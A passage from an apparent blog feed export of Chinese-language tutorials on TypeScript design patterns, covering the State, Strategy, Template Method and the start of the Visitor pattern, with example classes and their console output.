<h5 id="NightState-ts-表示晚上状态的类，实现了State的接口"><a href="#NightState-ts-表示晚上状态的类，实现了State的接口" class="headerlink" title="NightState.ts 表示晚上状态的类，实现了State的接口"></a>NightState.ts 表示晚上状态的类，实现了State的接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Context &#125; from &quot;.&#x2F;Context&quot;;</span><br><span class="line">import &#123; State &#125; from &quot;.&#x2F;State&quot;;</span><br><span class="line">import DayState from &quot;.&#x2F;DayState&quot;;</span><br><span class="line"></span><br><span class="line">export default class NightState implements State &#123;</span><br><span class="line">    private static singleton: NightState &#x3D; new NightState();</span><br><span class="line">    public static getInstance(): NightState &#123;</span><br><span class="line">        return this.singleton;</span><br><span class="line">    &#125;</span><br><span class="line">    doClock(context: Context, hour: number): void &#123;</span><br><span class="line">        if (hour &gt;&#x3D; 9 &amp;&amp; hour &lt; 17) &#123;</span><br><span class="line">            context.changeState(DayState.getInstance())</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    doUse(context: Context): void &#123;</span><br><span class="line">        context.recordLog(&quot;紧急：晚上使用金库！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    doAlarm(context: Context): void &#123;</span><br><span class="line">        context.callSecurityCenter(&quot;按下警铃（晚上）&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">    doPhone(context: Context): void &#123;</span><br><span class="line">        context.callSecurityCenter(&quot;晚上的通话录音&quot;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public toString(): string &#123;</span><br><span class="line">        return &quot;[晚上]&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Context-ts-表示管理金库的状态，并与报警中心联系的接口"><a href="#Context-ts-表示管理金库的状态，并与报警中心联系的接口" class="headerlink" title="Context.ts 表示管理金库的状态，并与报警中心联系的接口"></a>Context.ts 表示管理金库的状态，并与报警中心联系的接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; State &#125; from &quot;.&#x2F;State&quot;;</span><br><span class="line"></span><br><span class="line">export interface Context &#123;</span><br><span class="line">    setClock(hour: number): void;</span><br><span class="line">    changeState(state: State): void;</span><br><span class="line">    callSecurityCenter(msg: string): void;</span><br><span class="line">    recordLog(msg: string): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Safe-ts-实现了Context接口"><a href="#Safe-ts-实现了Context接口" class="headerlink" title="Safe.ts 实现了Context接口"></a>Safe.ts 实现了Context接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Context &#125; from &quot;.&#x2F;Context&quot;;</span><br><span class="line">import &#123; State &#125; from &quot;.&#x2F;State&quot;;</span><br><span class="line">import DayState from &quot;.&#x2F;DayState&quot;;</span><br><span class="line"></span><br><span class="line">export default class Safe implements Context &#123;</span><br><span class="line">    public state: State &#x3D; DayState.getInstance();</span><br><span class="line"></span><br><span class="line">    private clock: number;</span><br><span class="line">    public setClock(hour: number): void &#123;</span><br><span class="line">        this.clock &#x3D; hour;</span><br><span class="line">        console.log(&#96;当前时间是$&#123;hour&#125;&#96;);</span><br><span class="line">        this.state.doClock(this, this.clock);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public changeState(state: State): void &#123;</span><br><span class="line">        console.log(&#96;从$&#123;this.state&#125;状态变为了$&#123;state&#125;状态&#96;);</span><br><span class="line">        this.state &#x3D; state;</span><br><span class="line">    &#125;</span><br><span class="line">    public callSecurityCenter(msg: string): void &#123;</span><br><span class="line">        console.log(&#96;call!$&#123;msg&#125;&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">    public recordLog(msg: string): void &#123;</span><br><span class="line">        console.log(&#96;record....!$&#123;msg&#125;&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Safe from &quot;.&#x2F;Safe&quot;;</span><br><span class="line"></span><br><span class="line">const safe: Safe &#x3D; new Safe();</span><br><span class="line">safe.setClock(10);</span><br><span class="line">safe.state.doUse(safe);</span><br><span class="line">safe.state.doAlarm(safe);</span><br><span class="line">safe.state.doPhone(safe);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">safe.setClock(20);</span><br><span class="line">safe.state.doUse(safe);</span><br><span class="line">safe.state.doAlarm(safe);</span><br><span class="line">safe.state.doPhone(safe);</span><br></pre></td></tr></table></figure>
<h5 id="result"><a href="#result" class="headerlink" title="result"></a>result</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当前时间是10</span><br><span class="line">record....!使用金库（白天）</span><br><span class="line">call!按下警铃（白天）</span><br><span class="line">call!正常通话（白天）</span><br><span class="line">当前时间是20</span><br><span class="line">从[白天]状态变为了[晚上]状态</span><br><span class="line">record....!紧急：晚上使用金库！</span><br><span class="line">call!按下警铃（晚上）</span><br><span class="line">call!晚上的通话录音</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><img src="https://upload-images.jianshu.io/upload_images/10024246-43d4a68e88cdf387.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="类图"><h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2></li>
<li>State（状态）<br>State定义了根据不同状态进行不同处理的接口，该接口是那些<code>处理内容依赖于状态的方法的集合</code>。</li>
<li>ConcreteState（具体状态）<br>ConcreteState角色表示各个具体的状态，实现了State的接口。示例中DayState和NightState</li>
<li>Context（状况、前后关系、上下文）<br>Context角色持有当前状态的ConcreteState，此外，它还定义了供外部调用者使用State模式的接口。示例中Context和Safe类为该角色</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Strategy-Pattern模式（策略模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Strategy-Pattern%E6%A8%A1%E5%BC%8F%EF%BC%88%E7%AD%96%E7%95%A5%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<p><strong>策略模式（Strategy Pattern）</strong>:一个类的行为或其算法可以在运行时更改。这种类型的设计模式属于行为型模式。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>定义一系列的算法,把它们一个个封装起来, 并且使它们可相互替换。</li>
<li><strong>主要解决：</strong>在有多种算法相似的情况下，使用 if…else 所带来的复杂和难以维护。</li>
<li><strong>何时使用：</strong>一个系统有许多许多类，而区分它们的只是他们直接的行为。</li>
<li><strong>如何解决：</strong>将这些算法封装成一个一个的类，任意地替换。</li>
<li><strong>关键代码：</strong>实现同一个接口。</li>
<li><strong>优点：</strong><br>1、算法可以自由切换。<br>2、避免使用多重条件判断。<br>3、扩展性良好。</li>
<li><strong>缺点：</strong><br>1、策略类会增多。<br>2、所有策略类都需要对外暴露。<blockquote>
<p>注意事项：如果一个系统的策略多于四个，就需要考虑使用混合模式，解决策略类膨胀的问题。</p>
</blockquote>
</li>
</ul>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h5 id="Hand-ts-表示猜拳游戏中的手势类"><a href="#Hand-ts-表示猜拳游戏中的手势类" class="headerlink" title="Hand.ts 表示猜拳游戏中的手势类"></a>Hand.ts 表示猜拳游戏中的手势类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default class Hand &#123;</span><br><span class="line">    public HANDVALUE_GUU &#x3D; 0;&#x2F;&#x2F;表示石头的值</span><br><span class="line">    public HANDVALUE_CHO &#x3D; 1;&#x2F;&#x2F;表示剪刀的值</span><br><span class="line">    public HANDVALUE_PAA &#x3D; 2;&#x2F;&#x2F;表示布的值</span><br><span class="line"></span><br><span class="line">    private name: Array&lt;string&gt; &#x3D; [&quot;石头&quot;, &quot;剪刀&quot;, &quot;布&quot;];</span><br><span class="line"></span><br><span class="line">    private handValue: number;</span><br><span class="line">    constructor(handValue: number) &#123;</span><br><span class="line">        this.handValue &#x3D; handValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public getHand(handValue: number): Hand &#123;</span><br><span class="line">        return new Hand(handValue);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public isStrongerThan(h: Hand): boolean &#123;</span><br><span class="line">        return this.fight(h) &#x3D;&#x3D; 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public isWeakerThan(h: Hand): boolean &#123;</span><br><span class="line">        return this.fight(h) &#x3D;&#x3D; -1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private fight(h: Hand): number &#123;</span><br><span class="line">        if (this.handValue &#x3D;&#x3D; h.handValue) &#123;</span><br><span class="line">            return 0;</span><br><span class="line">        &#125; else if ((this.handValue + 1) % 3 &gt; h.handValue) &#123;</span><br><span class="line">            return 1;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return -1;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    public toString(): string &#123;</span><br><span class="line">        return this.name[this.handValue];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Strategy-ts-表示猜拳游戏中的策略的类"><a href="#Strategy-ts-表示猜拳游戏中的策略的类" class="headerlink" title="Strategy.ts 表示猜拳游戏中的策略的类"></a>Strategy.ts 表示猜拳游戏中的策略的类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Hand from &quot;.&#x2F;Hand&quot;;</span><br><span class="line"></span><br><span class="line">export interface Strategy &#123;</span><br><span class="line">    nextHand(): Hand;</span><br><span class="line">    study(win: boolean): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="WinningStrategy-ts-表示如果这局获胜，那么下一局同样手势的类"><a href="#WinningStrategy-ts-表示如果这局获胜，那么下一局同样手势的类" class="headerlink" title="WinningStrategy.ts 表示如果这局获胜，那么下一局同样手势的类"></a>WinningStrategy.ts 表示如果这局获胜，那么下一局同样手势的类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Strategy &#125; from &quot;.&#x2F;type&quot;;</span><br><span class="line">import Hand from &quot;.&#x2F;Hand&quot;;</span><br><span class="line"></span><br><span class="line">export default class WinningStrategy implements Strategy &#123;</span><br><span class="line">    private win: boolean &#x3D; false;</span><br><span class="line">    private prevHand: Hand;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public nextHand(): Hand &#123;</span><br><span class="line">        if (!this.win) &#123;</span><br><span class="line">            const random &#x3D; Math.floor(Math.random() * 3);</span><br><span class="line">            const hand &#x3D; new Hand(random);</span><br><span class="line">            this.prevHand &#x3D; hand.getHand(random);</span><br><span class="line">        &#125;</span><br><span class="line">        return this.prevHand;</span><br><span class="line">    &#125;</span><br><span class="line">    public study(win: boolean) &#123;</span><br><span class="line">        this.win &#x3D; win;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="RandomStragegy-ts-表示每次都随机手势"><a href="#RandomStragegy-ts-表示每次都随机手势" class="headerlink" title="RandomStragegy.ts 表示每次都随机手势"></a>RandomStragegy.ts 表示每次都随机手势</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Strategy &#125; from &quot;.&#x2F;type&quot;;</span><br><span class="line">import Hand from &quot;.&#x2F;Hand&quot;;</span><br><span class="line"></span><br><span class="line">export default class RandomStragegy implements Strategy &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    public nextHand(): Hand &#123;</span><br><span class="line">        const random &#x3D; Math.floor(Math.random() * 3);</span><br><span class="line">        const hand &#x3D; new Hand(random);</span><br><span class="line">        return hand.getHand(random);</span><br><span class="line">    &#125;</span><br><span class="line">    public study(win: boolean) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Player-ts-猜拳游戏的选手类"><a href="#Player-ts-猜拳游戏的选手类" class="headerlink" title="Player.ts 猜拳游戏的选手类"></a>Player.ts 猜拳游戏的选手类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; Strategy &#125; from &quot;.&#x2F;type&quot;;</span><br><span class="line">import Hand from &quot;.&#x2F;Hand&quot;;</span><br><span class="line"></span><br><span class="line">export default class Play &#123;</span><br><span class="line">    private name: string;</span><br><span class="line">    private winCount: number &#x3D; 0;</span><br><span class="line">    private loseCount: number &#x3D; 0;</span><br><span class="line">    private gameCount: number &#x3D; 0;</span><br><span class="line">    private stragegy: Strategy</span><br><span class="line">    constructor(name: string, stragegy: Strategy) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">        this.stragegy &#x3D; stragegy;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public nextHand(): Hand &#123;</span><br><span class="line">        return this.stragegy.nextHand()</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public win(): void &#123;</span><br><span class="line">        this.stragegy.study(true);</span><br><span class="line">        this.winCount++;</span><br><span class="line">        this.gameCount++;</span><br><span class="line">    &#125;</span><br><span class="line">    public lose(): void &#123;</span><br><span class="line">        this.stragegy.study(false);</span><br><span class="line">        this.loseCount++;</span><br><span class="line">        this.gameCount++;</span><br><span class="line">    &#125;</span><br><span class="line">    public even() &#123;</span><br><span class="line">        this.gameCount++;</span><br><span class="line">    &#125;</span><br><span class="line">    public toString(): string &#123;</span><br><span class="line">        return &#96;[$&#123;this.name&#125;:$&#123;this.gameCount&#125; games,$&#123;this.winCount&#125; win,$&#123;this.loseCount&#125; lose]&#96;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="index-ts"><a href="#index-ts" class="headerlink" title="index.ts"></a>index.ts</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import Play from &quot;.&#x2F;Play&quot;;</span><br><span class="line">import WinningStrategy from &quot;.&#x2F;WinningStrategy&quot;;</span><br><span class="line">import RandomStragegy from &quot;.&#x2F;RandomStragegy&quot;;</span><br><span class="line"></span><br><span class="line">const play1: Play &#x3D; new Play(&quot;Trao&quot;, new WinningStrategy());&#x2F;&#x2F;坚持上一次赢</span><br><span class="line">const play2: Play &#x3D; new Play(&quot;Haha&quot;, new RandomStragegy());&#x2F;&#x2F;随机</span><br><span class="line">for (let i &#x3D; 0; i &lt; 20; i++) &#123;</span><br><span class="line">    const nextHand1 &#x3D; play1.nextHand();</span><br><span class="line">    const nextHand2 &#x3D; play2.nextHand();</span><br><span class="line">    if (nextHand1.isStrongerThan(nextHand2)) &#123;</span><br><span class="line">        console.log(&#96;Winner $&#123;play1.toString()&#125; $&#123;nextHand1.toString()&#125;&#96;);</span><br><span class="line">        play1.win();</span><br><span class="line">        play2.lose();</span><br><span class="line">    &#125; else if (nextHand2.isStrongerThan(nextHand1)) &#123;</span><br><span class="line">        console.log(&#96;Winner $&#123;play2.toString()&#125;  $&#123;nextHand2.toString()&#125;&#96;);</span><br><span class="line">        play2.win();</span><br><span class="line">        play1.lose();</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        console.log(&#96;Even... $&#123;nextHand1.toString()&#125;&#96;);</span><br><span class="line">        play2.even();</span><br><span class="line">        play1.even();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="result"><a href="#result" class="headerlink" title="result"></a>result</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Even... 布</span><br><span class="line">Even... 布</span><br><span class="line">Even... 布</span><br><span class="line">Even... 剪刀</span><br><span class="line">Winner [Haha:5 games,1 win,0 lose]  剪刀</span><br><span class="line">Winner [Trao:6 games,1 win,1 lose] 剪刀</span><br><span class="line">Even... 剪刀</span><br><span class="line">Even... 剪刀</span><br><span class="line">Even... 剪刀</span><br><span class="line">Winner [Trao:10 games,2 win,1 lose] 剪刀</span><br><span class="line">Even... 剪刀</span><br><span class="line">Winner [Trao:12 games,3 win,1 lose] 剪刀</span><br><span class="line">Even... 剪刀</span><br><span class="line">Winner [Trao:14 games,4 win,1 lose] 剪刀</span><br><span class="line">Winner [Trao:15 games,5 win,1 lose] 剪刀</span><br><span class="line">Even... 剪刀</span><br><span class="line">Even... 剪刀</span><br><span class="line">Winner [Trao:18 games,6 win,1 lose] 剪刀</span><br><span class="line">Winner [Trao:19 games,7 win,1 lose] 剪刀</span><br><span class="line">Even... 剪刀</span><br><span class="line">————————————Result————————————————</span><br><span class="line">Result [Trao:20 games,7 win,1 lose]</span><br><span class="line">Result [Haha:20 games,1 win,7 lose]</span><br></pre></td></tr></table></figure>
<h2 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h2><p><img src="https://upload-images.jianshu.io/upload_images/10024246-78dcce422e6de9d8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<h2 id="角色"><a href="#角色" class="headerlink" title="角色"></a>角色</h2><ul>
<li>Strategy（策略）<br>Strategy角色决定实现策略所必须的接口</li>
<li>ConcreteStrategy（具体的策略）<br>ConcreteStrategy角色负责实现Strategy角色的接口，即负责实现具体的策略（方法、算法）。</li>
<li>Context（上下文）<br>负责使用Strategy角色。Context角色保存ConcreteStrategy角色的实例，彬使用ConcreteStrategy角色去实现需求</li>
</ul>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Template-Method（模板方法设计模式）</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Template-Method%EF%BC%88%E6%A8%A1%E6%9D%BF%E6%96%B9%E6%B3%95%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%89/</url>
    <content><![CDATA[<h3 id="模板方法设计模式"><a href="#模板方法设计模式" class="headerlink" title="模板方法设计模式"></a>模板方法设计模式</h3><blockquote>
<p>在模板模式（Template Method）中，一个抽象类公开定义了执行它的方法的方式/模板。它的子类可以按需要重写方法实现，但调用将以抽象类中定义的方式进行。这种类型的设计模式属于行为型模式。</p>
</blockquote>
<h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><ul>
<li><p><strong>意图：</strong>定义一个操作中的算法的骨架，而将一些步骤延迟到子类中。模板方法使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。</p>
</li>
<li><p><strong>主要解决：</strong>一些方法通用，却在每一个子类都重新写了这一方法。</p>
</li>
<li><p><strong>何时使用：</strong>有一些通用的方法。</p>
</li>
<li><p><strong>如何解决：</strong>将这些通用算法抽象出来。</p>
</li>
<li><p><strong>关键代码：</strong>在抽象类实现，其他步骤在子类实现。</p>
</li>
<li><p><strong>优点：</strong></p>
<blockquote>
<ol>
<li> 封装不变部分，扩展可变部分。 </li>
<li>提取公共代码，便于维护。 </li>
<li>行为由父类控制，子类实现。</li>
</ol>
</blockquote>
</li>
<li><p><strong>使用场景：</strong></p>
<blockquote>
<ol>
<li>有多个子类共有的方法，且逻辑相同。 </li>
<li>重要的、复杂的方法，可以考虑作为模板方法。</li>
</ol>
</blockquote>
</li>
</ul>
<h3 id="AbstractDisplay类：定义打印逻辑"><a href="#AbstractDisplay类：定义打印逻辑" class="headerlink" title="AbstractDisplay类：定义打印逻辑"></a>AbstractDisplay类：定义打印逻辑</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export default abstract class AbstractDisplay &#123;</span><br><span class="line">    public abstract open(): void;</span><br><span class="line">    public abstract print(): void;</span><br><span class="line">    public abstract close(): void;</span><br><span class="line">    public display(): void &#123;</span><br><span class="line">        this.open();</span><br><span class="line">        for (let i &#x3D; 0; i &lt; 5; i++) &#123;</span><br><span class="line">            this.print();</span><br><span class="line">        &#125;</span><br><span class="line">        this.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="CharDisplay类-打印方式"><a href="#CharDisplay类-打印方式" class="headerlink" title="CharDisplay类:打印方式"></a>CharDisplay类:打印方式</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import AbstractDisplay from &quot;.&#x2F;AbstractDisplay&quot;;</span><br><span class="line"></span><br><span class="line">export default class CharDisplay extends AbstractDisplay &#123;</span><br><span class="line">    private ch: string;</span><br><span class="line"></span><br><span class="line">    constructor(ch: string) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.ch &#x3D; ch;</span><br><span class="line">    &#125;</span><br><span class="line">    public open() &#123;</span><br><span class="line">        console.log(&quot;《&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public print() &#123;</span><br><span class="line">        console.log(this.ch);</span><br><span class="line">    &#125;</span><br><span class="line">    public close() &#123;</span><br><span class="line">        console.log(&quot;》&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="StringDisplay类："><a href="#StringDisplay类：" class="headerlink" title="StringDisplay类："></a>StringDisplay类：</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import AbstractDisplay from &quot;.&#x2F;AbstractDisplay&quot;;</span><br><span class="line"></span><br><span class="line">export default class StringDisplay extends AbstractDisplay &#123;</span><br><span class="line">    private str: string;</span><br><span class="line">    constructor(str: string) &#123;</span><br><span class="line">        super();</span><br><span class="line">        this.str &#x3D; str;</span><br><span class="line">    &#125;</span><br><span class="line">    public open() &#123;</span><br><span class="line">        console.log(&quot;+-----+&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public print() &#123;</span><br><span class="line">        console.log(&#96;|$&#123;this.str&#125;|&#96;);</span><br><span class="line">    &#125;</span><br><span class="line">    public close() &#123;</span><br><span class="line">        console.log(&quot;+-----+&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="main函数"><a href="#main函数" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import AbstractDisplay from &quot;.&#x2F;AbstractDisplay&quot;</span><br><span class="line">import CharDisplay from &quot;.&#x2F;CharDisplay&quot;</span><br><span class="line">import StringDisplay from &quot;.&#x2F;StringDisplay&quot;;</span><br><span class="line"></span><br><span class="line">const d1: AbstractDisplay &#x3D; new CharDisplay(&quot;H&quot;);</span><br><span class="line">const d2: AbstractDisplay &#x3D; new StringDisplay(&quot;Hello&quot;)</span><br><span class="line">d1.display();</span><br><span class="line">d2.display();</span><br></pre></td></tr></table></figure>
<h3 id="输出"><a href="#输出" class="headerlink" title="输出"></a>输出</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">《</span><br><span class="line">H</span><br><span class="line">H</span><br><span class="line">H</span><br><span class="line">H</span><br><span class="line">H</span><br><span class="line">》</span><br><span class="line">+-----+</span><br><span class="line">|Hello|</span><br><span class="line">|Hello|</span><br><span class="line">|Hello|</span><br><span class="line">|Hello|</span><br><span class="line">|Hello|</span><br><span class="line">+-----+</span><br></pre></td></tr></table></figure>
<h3 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h3><p>AbstractClass（抽象类）：AbstractClass不仅负责实现模板方法，还负责声明模板方法中所使用的的抽象方法，这些方法在ConcreteClass去实现<br>ConcreteClass（具体子类）：具体实现AbstractClass类中定义的抽象方法</p>
<h3 id="类图"><a href="#类图" class="headerlink" title="类图"></a>类图</h3><p><img src="https://upload-images.jianshu.io/upload_images/10024246-7f402cd441e847d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Template Method类图"></p>
]]></content>
      <categories>
        <category>DesignPattern</category>
      </categories>
  </entry>
  <entry>
    <title>Visitor-Pattern(访问者模式)</title>
    <url>/nirvana/DesignPattern/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%EF%BC%88TypeScript%EF%BC%89/Visitor-Pattern(%E8%AE%BF%E9%97%AE%E8%80%85%E6%A8%A1%E5%BC%8F)/</url>
    <content><![CDATA[<p><strong>访问者模式（Visitor Pattern）</strong>访问者模式是一种将数据操作和数据结构分离的设计模式。这种类型的设计模式属于行为型模式。根据模式，元素对象已接受访问者对象，这样访问者对象就可以处理元素对象上的操作。</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><ul>
<li><strong>意图：</strong>主要将数据结构与数据操作分离。</li>
<li><strong>主要解决：</strong>稳定的数据结构和易变的操作耦合问题。</li>
<li><strong>何时使用：</strong>需要对一个对象结构中的对象进行很多不同的并且不相关的操作，而需要避免让这些操作”污染”这些对象的类，使用访问者模式将这些封装到类中。</li>
<li><strong>如何解决：</strong>在被访问的类里面加一个对外提供接待访问者的接口。</li>
<li><strong>关键代码：</strong>在数据基础类里面有一个方法接受访问者，将自身引用传入访问者。</li>
<li><strong>优点：</strong><br>1、符合单一职责原则。<br>2、优秀的扩展性。<br>3、灵活性。</li>
<li><strong>缺点：</strong><br>1、具体元素对访问者公布细节，违反了迪米特原则。<br>2、具体元素变更比较困难。<br>3、违反了依赖倒置原则，依赖了具体类，没有依赖抽象。</li>
<li><strong>使用场景：</strong><br>1、对象结构中对象对应的类很少改变，但经常需要在此对象结构上定义新的操作。<br>2、需要对一个对象结构中的对象进行很多不同的并且不相关的操作，而需要避免让这些操作”污染”这些对象的类，也不希望在增加新操作时修改这些类。<blockquote>
<p>注意事项：访问者可以对功能进行统一，可以做报表、UI、拦截器与过滤器。</p>
</blockquote>
</li>
</ul>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><h5 id="ComputerPart-ts-表示元素的接口"><a href="#ComputerPart-ts-表示元素的接口" class="headerlink" title="ComputerPart.ts 表示元素的接口"></a>ComputerPart.ts 表示元素的接口</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; ComputerPartVisitor &#125; from &quot;.&#x2F;ComputerPartVisitor&quot;;</span><br><span class="line"></span><br><span class="line">export interface ComputerPart &#123;</span><br><span class="line">    accept(computerPartVisitor: ComputerPartVisitor): void;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Keyboard-ts-键盘实体类"><a href="#Keyboard-ts-键盘实体类" class="headerlink" title="Keyboard.ts 键盘实体类"></a>Keyboard.ts 键盘实体类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; ComputerPartVisitor &#125; from &quot;.&#x2F;ComputerPartVisitor&quot;;</span><br><span class="line">import &#123; ComputerPart &#125; from &quot;.&#x2F;ComputerPart&quot;;</span><br><span class="line"></span><br><span class="line">export default class Keyboard implements ComputerPart &#123;</span><br><span class="line">    public name: string;</span><br><span class="line">    public accept(computerPartVisitor: ComputerPartVisitor): void &#123;</span><br><span class="line">        this.name &#x3D; &quot;Keyboard&quot;;</span><br><span class="line">        computerPartVisitor.visit(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Mouse-ts-鼠标实体类"><a href="#Mouse-ts-鼠标实体类" class="headerlink" title="Mouse.ts 鼠标实体类"></a>Mouse.ts 鼠标实体类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; ComputerPartVisitor &#125; from &quot;.&#x2F;ComputerPartVisitor&quot;;</span><br><span class="line">import &#123; ComputerPart &#125; from &quot;.&#x2F;ComputerPart&quot;;</span><br><span class="line"></span><br><span class="line">export default class Mouse implements ComputerPart &#123;</span><br><span class="line">    public name: string;</span><br><span class="line">    public accept(computerPartVisitor: ComputerPartVisitor): void &#123;</span><br><span class="line">        this.name &#x3D; &quot;Mouse&quot;;</span><br><span class="line">        computerPartVisitor.visit(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="Monitor-ts-显示器实体类"><a href="#Monitor-ts-显示器实体类" class="headerlink" title="Monitor.ts 显示器实体类"></a>Monitor.ts 显示器实体类</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123; ComputerPartVisitor &#125; from &quot;.&#x2F;ComputerPartVisitor&quot;;</span><br><span class="line">import &#123; ComputerPart &#125; from &quot;.&#x2F;ComputerPart&quot;;</span><br><span class="line"></span><br><span class="line">export default class Monitor implements ComputerPart &#123;</span><br><span class="line">    public name: string;</span><br><span class="line">    public accept(computerPartVisitor: ComputerPartVisitor): void &#123;</span><br><span class="line">        this.name &#x3D; &quot;Monitor&quot;;</span><br><span class="line">        computerPartVisitor.visit(this);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
